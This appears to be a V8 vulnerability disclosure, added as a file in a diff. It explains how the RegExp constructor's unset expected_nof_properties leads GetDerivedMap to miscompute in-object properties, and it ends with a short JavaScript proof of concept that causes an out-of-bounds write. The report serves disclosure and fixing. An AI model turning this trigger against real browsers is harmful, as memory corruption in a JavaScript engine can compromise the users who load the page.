@@ -1,0 +1,143 @@
+/*
+Bug:
+The Genesis::InitializeGlobal method initializes the constructor of RegExp as follows:
+    // Builtin functions for RegExp.prototype.
+    Handle<JSFunction> regexp_fun = InstallFunction(
+        global, "RegExp", JS_REGEXP_TYPE,
+        JSRegExp::kSize + JSRegExp::kInObjectFieldCount * kPointerSize,
+        JSRegExp::kInObjectFieldCount, factory->the_hole_value(),
+        Builtins::kRegExpConstructor);
+    InstallWithIntrinsicDefaultProto(isolate, regexp_fun,
+                                     Context::REGEXP_FUNCTION_INDEX);
+
+    Handle<SharedFunctionInfo> shared(regexp_fun->shared(), isolate);
+    shared->SetConstructStub(*BUILTIN_CODE(isolate, JSBuiltinsConstructStub));
+    shared->set_instance_class_name(isolate->heap()->RegExp_string());
+    shared->set_internal_formal_parameter_count(2);
+    shared->set_length(2);
+
+    ...
+
+I think "shared->expected_nof_properties()" should be the same as JSRegExp::kInObjectFieldCount. But it doesn't set "expected_nof_properties", it remains 0.
+
+There are other constructors that don't set "expected_nof_properties", but RegExp was the only useable constructor to exploit.
+
+Exploit:
+This can affect JSFunction::GetDerivedMap, which is used to create or get a Map object for the given constructor and "new.target", to incorrectly compute the number of in-object properties.
+
+Here's a snippet of the method.
+(https://cs.chromium.org/chromium/src/v8/src/objects.cc?rcl=0c287882ea233f299a91f6b72b56d8faaecf52c0&l=12966)
+
+MaybeHandle<Map> JSFunction::GetDerivedMap(Isolate* isolate,
+                                           Handle<JSFunction> constructor,
+                                           Handle<JSReceiver> new_target) {
+  ...
+  // Fast case, new.target is a subclass of constructor. The map is cacheable
+  // (and may already have been cached). new.target.prototype is guaranteed to
+  // be a JSReceiver.
+  if (new_target->IsJSFunction()) {
+    Handle<JSFunction> function = Handle<JSFunction>::cast(new_target);
+    ...
+
+    // Create a new map with the size and number of in-object properties
+    // suggested by |function|.
+
+    // Link initial map and constructor function if the new.target is actually a
+    // subclass constructor.
+    if (IsDerivedConstructor(function->shared()->kind())) {
+      Handle<Object> prototype(function->instance_prototype(), isolate);
+      InstanceType instance_type = constructor_initial_map->instance_type();
+      DCHECK(CanSubclassHaveInobjectProperties(instance_type));
+      int embedder_fields =
+          JSObject::GetEmbedderFieldCount(*constructor_initial_map);
+      int pre_allocated = constructor_initial_map->GetInObjectProperties() -
+                          constructor_initial_map->UnusedPropertyFields();
+      int instance_size;
+      int in_object_properties;
+      CalculateInstanceSizeForDerivedClass(function, instance_type,
+                                           embedder_fields, &instance_size,
+                                           &in_object_properties);
+
+      int unused_property_fields = in_object_properties - pre_allocated;
+      Handle<Map> map =
+          Map::CopyInitialMap(constructor_initial_map, instance_size,
+                              in_object_properties, unused_property_fields);
+      ...
+      return map;
+    }
+  }
+
+"unused_property_fields" is obtained by subtracting "pre_allocated" from "in_object_properties". And "in_object_properties" is obtained by adding the number of properties of "new_target" and its all super constructors using CalculateInstanceSizeForDerivedClass.
+
+Here's CalculateInstanceSizeForDerivedClass.
+
+void JSFunction::CalculateInstanceSizeForDerivedClass(
+    Handle<JSFunction> function, InstanceType instance_type,
+    int requested_embedder_fields, int* instance_size,
+    int* in_object_properties) {
+  Isolate* isolate = function->GetIsolate();
+  int expected_nof_properties = 0;
+  for (PrototypeIterator iter(isolate, function, kStartAtReceiver);
+       !iter.IsAtEnd(); iter.Advance()) {
+    Handle<JSReceiver> current =
+        PrototypeIterator::GetCurrent<JSReceiver>(iter);
+    if (!current->IsJSFunction()) break;
+    Handle<JSFunction> func(Handle<JSFunction>::cast(current));
+    // The super constructor should be compiled for the number of expected
+    // properties to be available.
+    Handle<SharedFunctionInfo> shared(func->shared());
+    if (shared->is_compiled() ||
+        Compiler::Compile(func, Compiler::CLEAR_EXCEPTION)) {
+      DCHECK(shared->is_compiled());
+      expected_nof_properties += shared->expected_nof_properties();
+    }
+    if (!IsDerivedConstructor(shared->kind())) {
+      break;
+    }
+  }
+  CalculateInstanceSizeHelper(instance_type, true, requested_embedder_fields,
+                              expected_nof_properties, instance_size,
+                              in_object_properties);
+}
+
+It iterates over all the super constructors, and sums each constructor's "expected_nof_properties()".
+
+If it fails to compile the constructor using Compiler::Compile due to somthing like a syntax error, it just clears the exception, and skips to the next iteration (Should this also count as a bug?).
+
+So using these, we can make "pre_allocated" higher than "in_object_properties" which may lead to OOB reads/writes.
+
+PoC:
+*/
+
+function gc() {
+    for (let i = 0; i < 20; i++)
+        new ArrayBuffer(0x2000000);
+}
+
+class Derived extends RegExp {
+    constructor(a) {
+        const a = 1;  // syntax error, Derived->expected_nof_properties() skipped
+    }
+}
+
+let o = Reflect.construct(RegExp, [], Derived);
+o.lastIndex = 0x1234;  // OOB write
+
+gc();
+
+/*
+  int pre_allocated = constructor_initial_map->GetInObjectProperties() -  // 1
+                      constructor_initial_map->UnusedPropertyFields();    // 0
+  int instance_size;
+  int in_object_properties;
+  CalculateInstanceSizeForDerivedClass(function, instance_type,
+                                       embedder_fields, &instance_size,
+                                       &in_object_properties);
+
+  // in_object_properties == 0, pre_allocated == 1
+  int unused_property_fields = in_object_properties - pre_allocated;
+
+
+Another bug?
+There's a comment saying "Fast case, new.target is a subclass of constructor." in the JSFunction::GetDerivedMap method, but it doesn't check that "new_target" is actually a subclass of "constructor". So if "new_target" is not a subclass of "constructor", "pre_allocated" can be higher than "in_object_properties". To exploit this, it required to be able to change the value of "constructor_initial_map->UnusedPropertyFields()", but I couldn't find any way. So I'm not so sure about this part.
+*/
